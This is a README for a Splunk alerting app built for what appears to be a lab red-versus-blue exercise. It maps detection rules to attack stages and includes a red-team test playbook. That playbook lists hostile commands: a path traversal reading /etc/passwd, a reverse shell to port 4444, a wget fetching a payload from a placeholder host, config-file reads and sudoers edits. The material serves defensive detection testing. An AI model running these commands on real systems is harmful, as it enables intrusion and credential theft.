# sisyphus_alerts — Book of Zeus detection app

Drop-in Splunk app: 15 scheduled alerts covering all 9 stages of the Dionysus red
attack path. Install on the **indexer (192.168.1.103)**.

## Install

1. Copy the whole `sisyphus_alerts/` folder into Splunk's apps directory on the indexer:
   - Windows: `C:\Program Files\Splunk\etc\apps\sisyphus_alerts`
   - Linux:   `/opt/splunk/etc/apps/sisyphus_alerts`
2. Restart Splunk:
   ```
   cd "C:\Program Files\Splunk\bin"
   splunk restart
   ```
3. The alerts are enabled and scheduled on install. Watch them fire under
   **Activity → Triggered Alerts**, or **Settings → Searches, reports, and alerts**
   (filter App = "Sisyphus Blue Alerts") to see/tune each one.

> `props.conf` in this app sets `SHOULD_LINEMERGE=false` for `linux_audit` and
> `pfsense` so records parse one-per-line and the field extractions work. It takes
> effect for **newly indexed** events after the restart.

## Alert → stage map

| Alert | Stage | Fires on |
|---|---|---|
| S1a ICMP Ping Sweep | 1 | `nmap -sn` across the range |
| S1b TCP Port Scan | 1 | `nmap -sV/-sC` many ports |
| S2a Directory Brute Force | 2 | gobuster 404 burst |
| S2b CGI Probe | 2 | `/cgi-bin/` requests |
| S2c Scanner User-Agent | 2 | gobuster/nikto/curl UA |
| S3a Path Traversal | 3 | `.%2e`/`%252e`/`..%2f` URIs |
| S3b Reverse Shell Egress 4444 | 3 | DMZ → Red :4444 |
| S4 Host Enumeration | 4 & 7 | whoami/id/ip/ps/find burst (host field = which box) |
| S5 Credential/Config File Access | 5 | config.php / shadow / .env reads |
| S6a SSH Pivot to Internal | 6 | accepted SSH from DMZ subnet |
| S6b Cross-Zone SSH (firewall) | 6 | DMZ→internal :22 at pfSense |
| S8a Sudoers Modification | 8 | `/etc/sudoers` write |
| S8b Privilege Escalation to Root | 8 | `sudo su`/`sudo /bin/bash`/root session |
| S9a Objective File Access | 9 | PandorasBox/NotForMortals/TOPSECRET/FOOLSGOLD |
| S9b Payload Transfer | 9 | wget/curl/scp (bonus thanatos) |

## Test it — run the red playbook, watch alerts trigger

| Run this (Red / on a victim host) | Alert that should fire |
|---|---|
| `nmap -sn 10.1.1.0/28` | S1a |
| `nmap -sV -sC 10.1.1.10` | S1b |
| `gobuster dir -u http://10.1.1.10 -w .../common.txt` | S2a, S2c |
| `curl http://10.1.1.10/cgi-bin/` | S2b |
| `curl "http://10.1.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"` | S3a |
| reverse shell to `203.0.113.x:4444` | S3b |
| `whoami; id; uname -a; ip a; ps aux; find /` on DMZ | S4 (host=dmz) |
| `cat /var/www/html/config.php` | S5 |
| `ssh NormAll@192.168.1.106` from the DMZ box | S6a, S6b |
| recon commands on the internal box | S4 (host=internal) |
| `sudo nano /etc/sudoers` | S8a |
| `sudo su` / `sudo /bin/bash` | S8b |
| `cat .../PandorasBox/TOPSECRET.txt` | S9a |
| `wget http://203.0.113.x/thanatos` | S9b |

## Tuning

- Each alert has `alert.suppress` (throttle) so one actor = one alert. Adjust
  `alert.suppress.period` or the `where` thresholds in `savedsearches.conf` if a
  rule is too chatty or too quiet, then restart.
- Recon rules are severity 2 (Info); exploit/pivot/escalation are severity 6 (Critical).
- The network rules self-parse `filterlog`; installing the **pfSense TA** as well
  won't break them and gives you nicer fields for ad-hoc searching.
